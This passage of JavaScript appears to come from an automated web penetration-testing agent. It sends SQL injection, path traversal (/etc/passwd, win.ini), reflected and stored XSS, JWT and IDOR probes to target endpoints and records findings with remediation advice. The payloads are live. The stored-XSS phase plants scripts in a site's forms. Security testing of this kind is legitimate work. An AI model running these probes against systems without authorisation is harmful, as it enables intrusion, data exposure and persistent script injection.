                        }

                        const sep = signal.endpoint.includes('?') ? '&' : '?';
                        const injectedUrl = `${signal.endpoint}${sep}${signal.param}=${encodeURIComponent(payload)}`;
                        const body = response.body || '';
                        const finding = {
                            type: signal.vulnType === 'sqli' ? 'SQL Injection' : signal.vulnType === 'ssti' ? 'SSTI' : signal.vulnType.toUpperCase(),
                            subtype: isErrorBasedSqli ? 'Error-based SQL Injection' : 'Injection',
                            severity: signal.vulnType === 'sqli'
                                ? (isErrorBasedSqli ? 'Critical' : 'High')
                                : signal.vulnType === 'ssti' ? 'High' : 'Medium',
                            verified: true,
                            endpoint: signal.endpoint,
                            param: signal.param,
                            method: 'GET',
                            payload,
                            curlPoC: `curl -sS -k -g '${injectedUrl}'`,
                            evidence: {
                                request: `GET ${injectedUrl}`,
                                response_snippet: body.slice(0, 2400),
                            },
                            cwe: signal.vulnType === 'sqli' ? 'CWE-89' : 'CWE-74',
                            owasp: 'A03:2021',
                            cvssScore: signal.vulnType === 'sqli' ? '8.5' : '7.2',
                            synopsis: `${(signal.vulnType || '').toUpperCase()} confirmed at ${signal.endpoint} [${signal.param}].`,
                            impact: 'Server-side injection or template execution risk.',
                            remediation: 'Sanitize input; use safe APIs and sandboxed templates.',
                        };

                        if (body.length < 48) {
                            attemptedFindings.push({
                                endpoint: signal.endpoint,
                                type: signal.vulnType,
                                payload,
                                failReason: 'Response body too short to attach reproducible evidence',
                            });
                            return;
                        }

                        if (pushVuln(finding)) {
                            memory.addConfirmedVuln(finding);
                            globalCoverage.addConfirmedFinding(finding);
                            onProgress({
                                phase: 'react', status: 'finding',
                                message: `🚨 ${finding.type} confirmed at ${signal.endpoint} [${signal.param}]`,
                                vulnerability: finding,
                            });
                        }
                        return;
                    }

                    attemptedFindings.push({ endpoint: signal.endpoint, type: signal.vulnType, payload, analysis });
                } catch { }
            });
        }
    }

    for (let i = 0; i < attackTasks.length; i += ATTACK_CONCURRENCY) {
        if (Date.now() > PHASE_DEADLINE) {
            onProgress({ phase: 'react', status: 'running', message: '⏱️ Phase 5 time budget exhausted — moving to auth/XSS phases' });
            break;
        }
        await Promise.all(attackTasks.slice(i, i + ATTACK_CONCURRENCY).map(t => t().catch(() => null)));
        await new Promise(r => setTimeout(r, 20));
    }

    // ── PHASE 6: Contextual Tech Payloads ─────────────────────────────────────
    if (Date.now() < PHASE_DEADLINE && signalEndpoints.length > 0) {
        onProgress({ phase: 'react', status: 'running', message: `🧩 Phase 6: Injecting Context-Specific Payloads against WAF...` });

        function selectPayloadsForContext(vulnType, techStack) {
            if (vulnType === 'xss') {
                const framework = techStack?.framework || 'unknown';
                const isJson = techStack?.apiStyle === 'json';
                return flattenPayloads(getFrameworkPayloads(framework, isJson));
            }
            
            const payloads = [];
            if (vulnType === 'lfi') {
                payloads.push(techStack.os === 'Windows' ? 'c:\\windows\\win.ini' : '/etc/passwd');
                payloads.push(techStack.os === 'Windows' ? '..\\..\\..\\windows\\win.ini' : '../../../../etc/passwd');
            }
            return payloads;
        }

        // Process ALL signal endpoints, not just the first 3 (fixing scan inconsistency)
        for (const signal of signalEndpoints) {
            const ctxPayloads = selectPayloadsForContext(signal.vulnType, techStack);
            for (const payload of ctxPayloads) {
                totalSteps++;
                attemptedFindings.push({ endpoint: signal.endpoint, type: signal.vulnType, payload });
                const response = await quickProbe(signal.endpoint, signal.param, payload);
                const ext = analyzeResponseExtended(response, { marker: 'root:x|alert(1)' }, signal.vulnType);
                if (ext.hasSignal) {
                    // Elevate via signal
                    attemptedFindings.push({ endpoint: signal.endpoint, type: signal.vulnType, payload, bypass: true });
                }
            }
        }
    }

    // ── PHASE 8: Search + Feedback XSS (Bug Bounty Gold) ─────────────────
    if (Date.now() < PHASE_DEADLINE) {
        const xssTargets = [
            ...reconForms
                .filter(f => /search|feedback|comment|contact|subscribe/i.test(f.action || ''))
                .map(f => ({
                    url: (() => {
                        const action = f.action || '';
                        if (action.startsWith('http')) return action;
                        const proto = _reactResolvedProtocol || 'http';
                        const host = target.replace(/^https?:\/\//, '').split('/')[0];
                        return `${proto}://${host}${action.startsWith('/') ? '' : '/'}${action}`;
                    })(),
                    inputs: (f.inputs || []).map(i => typeof i === 'string' ? i : i.name).filter(Boolean),
                    method: (f.method || 'GET').toUpperCase(),
                })),
            ...prioritized
                .filter(ep => /search|feedback|comment|query/i.test(ep))
                .map(ep => ({ url: ep, inputs: [extractBestParamForEndpoint(ep)], method: 'GET' })),
        ];

        const uniqueXssTargets = [];
        const seenXssUrls = new Set();
        for (const t of xssTargets) {
            if (!seenXssUrls.has(t.url)) { uniqueXssTargets.push(t); seenXssUrls.add(t.url); }
        }

        if (uniqueXssTargets.length > 0) {
            onProgress({
                phase: 'react', status: 'running',
                message: `🎯 Phase 8: XSS testing on ${uniqueXssTargets.length} search/feedback/comment surfaces...`
            });

            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
                '<svg/onload=alert(1)>',
                "'><img src=x onerror=alert(1)>",
            ];

            for (const xssTarget of uniqueXssTargets.slice(0, 10)) {
                if (isVulnTypeConfirmed(xssTarget.url, 'xss')) continue;
                
                const inputsToTest = xssTarget.inputs.length > 0 ? xssTarget.inputs : ['q', 'query', 'search'];

                for (const inputName of inputsToTest.slice(0, 3)) {
                    for (const xssPayload of xssPayloads) {
                        totalSteps++;
                        if (totalSteps >= maxIterations) break;

                        attemptedFindings.push({ endpoint: xssTarget.url, type: 'xss', payload: xssPayload });

                        let response;
                        if (xssTarget.method === 'GET') {
                            response = await quickProbe(xssTarget.url, inputName, xssPayload);
                        } else {
                            response = await fullFormProbe(xssTarget.url, xssTarget.method, xssTarget.inputs, inputName, xssPayload, globalSession);
                        }

                        const reflected =
                            response?.body &&
                            (response.body.includes(xssPayload) || bodyContainsPayload(response.body, xssPayload));
                        if (reflected) {
                            const isStored = /feedback|comment|contact|guestbook/i.test(xssTarget.url);
                            const sep = xssTarget.url.includes('?') ? '&' : '?';
                            const injectedUrl = `${xssTarget.url}${sep}${inputName}=${encodeURIComponent(xssPayload)}`;
                            let browserConfirmed = false;
                            let proof = null;

                            if (await isPlaywrightAvailable()) {
                                onProgress({ phase: 'react', status: 'running', message: `📸 Phase 8: browser PoC for ${xssTarget.url}...` });
                                proof = await captureXssProof({
                                    url: xssTarget.url,
                                    injectedUrl,
                                    vulnId: `RVPT-XSS-${Math.floor(Math.random() * 10000)}`,
                                    payloads: [xssPayload, '"><img src=x onerror=alert(1)>'],
                                });
                                browserConfirmed = !!proof?.confirmed;
                            }

                            if (!browserConfirmed) {
                                attemptedFindings.push({
                                    endpoint: xssTarget.url,
                                    type: 'xss',
                                    payload: xssPayload,
                                    failReason: 'Reflection detected in HTTP response but browser did not execute JavaScript (encoded/stripped output)',
                                });
                                break;
                            }

                            const finding = {
                                type: 'XSS',
                                subtype: isStored ? 'Stored XSS' : 'Reflected XSS',
                                severity: isStored ? 'High' : 'High',
                                verified: true,
                                confidence: 'Confirmed via Browser Rendering',
                                endpoint: xssTarget.url,
                                param: inputName,
                                method: xssTarget.method,
                                payload: xssPayload,
                                matched_pattern: xssPayload,
                                curlPoC: `curl -sS -k -g '${injectedUrl}'`,
                                evidence: {
                                    request: `GET ${injectedUrl}`,
                                    response_snippet: response.body.slice(
                                        Math.max(0, response.body.indexOf(xssPayload) - 100),
                                        response.body.indexOf(xssPayload) + xssPayload.length + 200
                                    ),
                                    playwrightProof: {
                                        screenshotPaths: proof.screenshots,
                                        confirmation: `Browser execution confirmed: ${proof.alertText || 'dialog/title proof'}`,
                                    },
                                },
                                cwe: 'CWE-79',
                                owasp: 'A07:2021',
                                cvssScore: isStored ? '8.1' : '7.1',
                                synopsis: `${isStored ? 'Stored' : 'Reflected'} XSS confirmed at ${xssTarget.url} with browser execution evidence.`,
                                impact: `Attacker can execute arbitrary JavaScript in victim's browser.`,
                                remediation: 'Apply context-aware output encoding and a strict Content-Security-Policy.',
                            };
                            if (pushVuln(finding)) {
                                memory.addConfirmedVuln(finding);
                                globalCoverage.addConfirmedFinding(finding);
                                onProgress({
                                    phase: 'react', status: 'finding',
                                    message: `🚨 CONFIRMED: ${finding.subtype} at ${xssTarget.url} [${inputName}]`,
                                    vulnerability: finding,
                                });
                            }
                            break;
                        }
                    }
                }
                await new Promise(r => setTimeout(r, 100));
            }
        }
    }

    // ── PHASE 8.5: Stored XSS Confirmation ──────────────────────────
    // [STEP 5] After posting payloads, revisit listing pages to check for persistence
    // Focus on: /feedback, /comment, /review, /message, /profile, /upload
    const storedXssCandidates = [];
    const isStoredXssTarget = (url) => /\/(feedback|comment|review|message|profile|upload|post|list|view|guestbook)/i.test(url);
    
    if (vulns.some(v => v.subtype === 'Stored XSS') || reconForms.some(f => isStoredXssTarget(f.action || ''))) {
        // Collect pages where payloads were submitted
        const feedbackForms = reconForms.filter(f => isStoredXssTarget(f.action || ''));
        const listingPages = [
            ...prioritized.filter(ep => /feedback|comment|guestbook|review|list|view|post/i.test(ep)),
            ...feedbackForms.map(f => {
                const action = f.action || '';
                if (action.startsWith('http')) return action;
                const proto = _reactResolvedProtocol || 'http';
                const host = target.replace(/^https?:\/\//, '').split('/')[0];
                return `${proto}://${host}${action.startsWith('/') ? '' : '/'}${action}`;
            }),
        ];

        const uniqueListingPages = [...new Set(listingPages)].slice(0, 10);

        if (uniqueListingPages.length > 0) {
            onProgress({ phase: 'react', status: 'running', message: `🔄 Phase 8.5: Stored XSS confirmation — revisiting ${uniqueListingPages.length} listing pages...` });

            const xssMarkers = ['<script>alert("XSS")</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>'];

            for (const page of uniqueListingPages) {
                if (totalSteps >= maxIterations) break;
                totalSteps++;

                try {
                    const response = await httpRequest.execute({ url: page, method: 'GET' });
                    if (response?.body) {
                        for (const marker of xssMarkers) {
                            if (response.body.includes(marker)) {
                                const finding = {
                                    type: 'XSS', subtype: 'Stored XSS (Confirmed Persistence)',
                                    severity: 'High', endpoint: page, param: 'N/A (stored)',
                                    method: 'GET', payload: marker,
                                    evidence: {
                                        request: `GET ${page}`,
                                        response_snippet: response.body.slice(
                                            Math.max(0, response.body.indexOf(marker) - 100),
                                            response.body.indexOf(marker) + marker.length + 200
                                        ),
                                    },
                                    cwe: 'CWE-79', owasp: 'A07:2021', cvssScore: '8.1',
                                    synopsis: `Stored XSS confirmed — payload persists in ${page} and executes for all visitors.`,
                                    impact: 'Attacker payload persists in server storage and executes in every visitor\'s browser. Session hijacking, defacement, and malware delivery possible.',
                                    remediation: '1. Sanitize all user input before storage.\n2. Encode output in HTML context.\n3. Implement CSP headers.',
                                };
                                if (pushVuln(finding)) {
                                    memory.addConfirmedVuln(finding);
                                    globalCoverage.addConfirmedFinding(finding);

                                    // Playwright proof — capture stored XSS persistence
                                    try {
                                        const config = (await import('../../config/env.js')).default;
                                        if (config.ENABLE_BROWSER_PROOF) {
                                            onProgress({ phase: 'react', status: 'running', message: `📸 Capturing stored XSS persistence proof at ${page}...` });
                                            const storedProof = await captureXssProof({
                                                url: page,
                                                injectedUrl: page,
                                                vulnId: `RVPT-STORED-${Math.floor(Math.random()*1000)}`
                                            });
                                            if (storedProof.confirmed) {
                                                finding.evidence.playwrightProof = {
                                                    screenshotPaths: storedProof.screenshots,
                                                    confirmation: `Executed JS and captured dialog: ${storedProof.alertText}`,
                                                    persisted: true,
                                                };
                                                onProgress({ phase: 'react', status: 'running', message: `📸 Stored XSS persistence proof captured!` });
                                            }
                                        }
                                    } catch { }

                                    onProgress({ phase: 'react', status: 'finding', message: `🚨 STORED XSS CONFIRMED at ${page}!`, vulnerability: finding });
                                }
                                break;
                            }
                        }
                    }
                } catch { }
            }
        }
    }

    // ── PHASE 5: JWT Weakness Analysis ────────────────────────────────────────
    if (Date.now() < PHASE_DEADLINE) {
        // Look for JWTs in responses we've already collected, or probe known endpoints
        const jwtEndpoints = [
            ...(reconData?.endpoints || []).map(e => typeof e === 'string' ? e : e.url || ''),
        ].filter(ep => ep && (/\/whoami|\/user|\/profile|\/me|\/api\/user/i.test(ep)));

        const uniqueJwt = [...new Set(jwtEndpoints)].slice(0, 3);

        if (uniqueJwt.length > 0) {
            onProgress({
                phase: 'react', status: 'running',
                message: `🔑 Phase 5: JWT weakness analysis on ${uniqueJwt.length} endpoints...`
            });

            for (const jwtUrl of uniqueJwt) {
                if (totalSteps >= maxIterations) break;
                totalSteps++;

                try {
                    const response = await httpRequest.execute({ url: jwtUrl, method: 'GET' });
                    if (response && response.body) {
                        // Extract JWT tokens from response body
                        const jwtPattern = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
                        const tokens = response.body.match(jwtPattern) || [];

                        for (const token of tokens.slice(0, 2)) {
                            const decoded = decodeJwt(token);
                            const issues = analyzeJwtWeakness(decoded);

                            for (const issue of issues) {
                                const finding = {
                                    type: 'JWT Weakness',
                                    subtype: issue.type,
                                    severity: issue.severity,
                                    endpoint: jwtUrl,
                                    param: 'Authorization',
                                    method: 'GET',
                                    payload: token.slice(0, 50) + '...',
                                    curlPoC: `curl -sS -k '${jwtUrl}'`,
                                    evidence: {
                                        request: `GET ${jwtUrl}`,
                                        response_snippet: `Header: ${JSON.stringify(decoded?.header)}\nPayload keys: ${Object.keys(decoded?.payload || {}).join(', ')}\nIssue: ${issue.detail}`
                                    },
                                    cwe: 'CWE-346',
                                    owasp: 'A02:2021',
                                    description: issue.detail,
                                    remediation: '- Use strong signing algorithms (RS256, ES256).\n- Never use alg:none in production.\n- Set short expiration times.\n- Avoid storing sensitive data in JWT payload.',
                                };

                                if (issue.severity === 'critical' || issue.severity === 'high') {
                                    if (pushVuln(finding)) {
                                        memory.addConfirmedVuln(finding);
                                        globalCoverage.addConfirmedFinding(finding);
                                        onProgress({
                                            phase: 'react', status: 'finding',
                                            message: `🚨 JWT Issue: ${issue.detail}`,
                                            vulnerability: finding,
                                        });
                                    }
                                } else {
                                    attemptedFindings.push(finding);
                                }
                            }
                        }
                    }
                } catch { }
            }
        }
    }
    // ── PHASE X: Browser Verified XSS Confirmation ──────────────────────────
    if (Date.now() < PHASE_DEADLINE && signalEndpoints.length > 0) {
        onProgress({ phase: 'react', status: 'running', message: `🌐 Phase X: Browser XSS verification...` });
        const sessionCookie = globalSession.getCookieHeader();
        const framework = techStack?.framework || 'unknown';
        const xssSignals = signalEndpoints.filter(s => s.vulnType === 'xss');

        for (const sig of xssSignals.slice(0, 10)) {
            if (isVulnTypeConfirmed(sig.endpoint, sig.vulnType)) continue;
            
            const { endpoint, param, method } = sig;
            const isJsonApi = sig.meta?.isJson === true;
            const payloadObjects = getFrameworkPayloads(framework, isJsonApi);
            const limitedPayloads = payloadObjects.slice(0, 4);

            for (const payloadObj of limitedPayloads) {
                const verified = await verifyXssInBrowser(
                    endpoint,
                    param,
                    method || 'GET',
                    sig.formData || {},
                    sessionCookie,
                    framework
                );

                if (verified.confirmed) {
                    const confirmedFinding = {
                        type: 'XSS',
                        subtype: 'Reflected XSS (Confirmed)',
                        severity: 'High',
                        confidence: 1.0,
                        verified: true,
                        proofType: verified.proofType,
                        endpoint: verified.targetUrl,
                        param: param,
                        method: verified.method,
                        payload: verified.payload,
                        evidence: verified.evidence,
                        cwe: 'CWE-79',
                        owasp: 'A03:2021',
                        cvssScore: '7.5',
                        synopsis: `XSS CONFIRMED at ${endpoint} [${param}] via browser rendering.`,
                        impact: 'Attacker can execute arbitrary JavaScript in the user context, potentially stealing cookies or hijacking sessions.',
                        remediation: 'Implement strict output encoding and a strong Content Security Policy (CSP).',
                    };
                    if (pushVuln(confirmedFinding)) {
                        globalCoverage.addConfirmedFinding(confirmedFinding);
                        onProgress({
                            phase: 'react', status: 'finding',
                            message: `🚨 CONFIRMED XSS: ${confirmedFinding.endpoint}`,
                            vulnerability: confirmedFinding,
                        });
                    }
                    break;
                }
            }
        }
    }

    // ── PHASE Y: Stored XSS Verification ─────────────────────────────────────
    if (Date.now() < PHASE_DEADLINE && authSession?.authenticated) {
        onProgress({ phase: 'react', status: 'running', message: `💾 Phase Y: Stored XSS verification...` });
        const patterns = STORED_XSS_INJECTION_PATTERNS || [];
        const framework = techStack?.framework || 'unknown';

        for (const pattern of patterns) {
            const injectCandidate = prioritized.find(e => pattern.pathPattern.test(e));
            if (!injectCandidate) continue;

            const injectPayloadBody = { ...pattern.injectFields };
            injectPayloadBody[pattern.fieldToInject] = `<img src=x onerror="document.title='INJECT_TOKEN'">`;

            for (const renderPath of pattern.renderPaths) {
                const proto = _reactResolvedProtocol || 'http';
                const host = target.replace(/^https?:\/\//, '').split('/')[0];
                const renderUrl = new URL(renderPath, `${proto}://${host}`).toString();

                const stored = await verifyStoredXss(
                    injectCandidate,
                    renderUrl,
                    injectPayloadBody,
                    globalSession.getCookieHeader(),
                    framework
                );

                if (stored.confirmed) {
                    const storedFinding = {
                        type: 'Stored XSS',
                        severity: 'Critical',
                        confidence: 1.0,
                        verified: true,
                        endpoint: renderUrl,
                        injectUrl: injectCandidate,
                        evidence: stored.evidence,
                        token: stored.token,
                        cwe: 'CWE-79',
                        owasp: 'A03:2021',
                        cvssScore: '8.5',
                        synopsis: `STORED XSS CONFIRMED at ${renderUrl}`,
                        impact: 'Attacker injected persistent payload that executes for all users visiting the page.',
                        remediation: 'Sanitize all stored input and use context-aware output encoding.',
                    };
                    if (pushVuln(storedFinding)) {
                        globalCoverage.addConfirmedFinding(storedFinding);
                        onProgress({
                            phase: 'react', status: 'finding',
                            message: `🚨 CONFIRMED STORED XSS: ${renderUrl}`,
                            vulnerability: storedFinding,
                        });
                    }
                    break;
                }
            }
        }
    }

    // ── PHASE Z: Directory Listing / FTP Exposure Proof ──────────────────────
    if (Date.now() < PHASE_DEADLINE) {
        onProgress({ phase: 'react', status: 'running', message: `📂 Phase Z: Directory listing verification...` });
        for (const ep of prioritized) {
            if (!/\/(ftp|files|uploads|backup|download)\b/i.test(ep)) continue;

            const ftpFindings = await verifyFtpExposure(ep);
            for (const f of ftpFindings) {
                const exposureFinding = {
                    type: f.type,
                    severity: f.severity,
                    verified: true,
                    confidence: 1.0,
                    endpoint: f.url,
                    evidence: f.evidence,
                    proofType: f.proofType,
                    files: f.files || [],
                    cwe: 'CWE-548',
                    owasp: 'A01:2021',
                    cvssScore: '5.3',
                    synopsis: `${f.type} verified at ${f.url}`,
                    impact: 'Sensitive files or directory structures are exposed to the public.',
                    remediation: 'Disable directory indexing and restrict access to sensitive file paths.',
                };
                if (pushVuln(exposureFinding)) {
                    globalCoverage.addConfirmedFinding(exposureFinding);
                    onProgress({
                        phase: 'react', status: 'finding',
                        message: `🚨 ${f.type.toUpperCase()}: ${f.url}`,
                        vulnerability: exposureFinding,
                    });
                }
            }
        }
    }

    onProgress({
        phase: 'react', status: 'done',
        message: `✅ Hybrid Agent completed. ${vulns.length} vulns across ${prioritized.length} endpoints in ${totalSteps} steps.`
    });

    return {
        findings: vulns,
        chains,
        coverage: globalCoverage,
        trace: {
            totalSteps,
            payloadsTested: totalSteps,
            endpointsDiscovered: prioritized.length,
            triageSignals: signalEndpoints.length,
            attemptedFindings,
        },
        summary: `Pentester reasoning loop completed: ${prioritized.length} endpoints, ${signalEndpoints.length} signals, ${vulns.length} vulns in ${totalSteps} steps.`
    };
}

// ── E4: IDOR Probe with Session Mutation ──
async function idorSequentialProbe(url, param, httpReq) {
    try {
        const results = [];
        const cookieHeader = globalSession?.getCookieHeader?.() || '';

        for (const id of [1, 2, 3, 99, 100]) {
            const sep = url.includes("?") ? "&" : "?";
            const probeUrl = `${url}${sep}${param}=${id}`;

            // Probe WITHOUT auth (anonymous)
            const anonResp = await httpReq.execute({ url: probeUrl, method: "GET", headers: {} });
            // Probe WITH auth (authenticated session)
            const authHeaders = cookieHeader ? { Cookie: cookieHeader } : {};
            const authResp = await httpReq.execute({ url: probeUrl, method: "GET", headers: authHeaders });

            results.push({
                id,
                anon: { status: anonResp?.status, size: (anonResp?.body || '').length },
                auth: { status: authResp?.status, size: (authResp?.body || '').length },
            });
        }
        if (results.length < 2) return { hasSignal: false };

        // Analyze: if anon can access other user's data → critical IDOR
        const anonSizes = results.map(r => r.anon.size);
        const authSizes = results.map(r => r.auth.size);
        const anonMaxDiff = Math.max(...anonSizes) - Math.min(...anonSizes);
        const authMaxDiff = Math.max(...authSizes) - Math.min(...authSizes);

        // Different content per ID = resource enumeration
        const hasSignal = anonMaxDiff > 50 || authMaxDiff > 50;

        // If anon gets same content as auth → broken access control
        const anonAccessible = results.some(r =>
            r.anon.status === 200 && r.auth.status === 200 &&
            Math.abs(r.anon.size - r.auth.size) < 50 && r.anon.size > 100
        );

        return {
            hasSignal,
            anonAccessible,
            severity: anonAccessible ? 'critical' : (hasSignal ? 'high' : 'low'),
            details: results
        };
    } catch {
        return { hasSignal: false };
    }
}

// ── Strict Boolean SQLi Verification ──
async function verifySqliBoolean(endpoint, param, method) {
    try {
        const sep = endpoint.includes('?') ? '&' : '?';
        const baseUrl = `${endpoint}${sep}${param}=`;
        const sqlErr = /sql|syntax|mysql|postgres|ora-|jdbc|sqlite|unclosed quotation|sqlstate/i;

        const resNormal = await httpRequest.execute({ url: `${baseUrl}1`, method });
        const resTrue = await httpRequest.execute({ url: `${baseUrl}1%20OR%201=1--`, method });
        const resFalse = await httpRequest.execute({ url: `${baseUrl}1%20OR%201=2--`, method });
        const resTick = await httpRequest.execute({ url: `${baseUrl}'`, method });

        if (!resNormal || !resTrue || !resFalse) return false;

        if (resTick && sqlErr.test(resTick.body || '')) return true;

        const lenTrue = resTrue.body?.length || 0;
        const lenFalse = resFalse.body?.length || 0;
        const diffTrueFalse = Math.abs(lenTrue - lenFalse);

        if (diffTrueFalse > 50 || resTrue.status !== resFalse.status) return true;
        if (sqlErr.test(resTrue.body || '') || sqlErr.test(resFalse.body || '')) return true;
        return false;
    } catch {
        return false;
    }
}
